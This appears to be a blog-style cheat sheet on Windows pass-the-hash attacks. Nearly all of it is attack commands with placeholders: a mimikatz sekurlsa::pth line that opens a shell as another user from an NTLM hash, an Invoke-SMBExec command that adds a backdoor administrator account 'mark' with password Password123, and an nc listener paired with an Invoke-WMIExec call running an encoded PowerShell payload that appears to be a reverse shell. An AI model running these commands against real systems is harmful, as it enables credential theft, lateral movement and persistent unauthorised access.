---
title: Windows Pass the Hash (PtH)
date: 2025-11-27 13:28:06

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Pass the Hash (PtH)

tags:
  - mimikatz
  - Invoke-TheHash

cover: /img/pth.png
top_img: /img/bg-img.jpg
description:
---

# Mimikatz ( local administrator privilege  )

➜ This command will create a new CMD session using the permissions of the user we want to impersonate.

```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:username /NTLM:<hash> /domain:<domain> /run:cmd.exe" exit
```

➜ When impersonating a local account, the `/domain` parameter should be set to `localhost` or simply `.`


# PowerShell Invoke-TheHash



➜ Since [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) uses `Invoke-SMBExec` and `Invoke-WMIExec` to authenticate and execute commands on the target, the NTLM hash used must belong to an `account with administrative rights` on the target.


#### Invoke-TheHash with SMB

➜ This command creates a new local user account and adds it to the `local Administrators group` on the target machine.

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target <target-ip> -Domain <domain> -Username <username> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### Invoke-TheHash with WMI

```
PS C:\tools> .\nc.exe -lvnp <Port>
```

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command "powershell -e JABjAGwAaQBlAG4Ad <snip> AGwAbwBzAGUAKAApAA=="
```



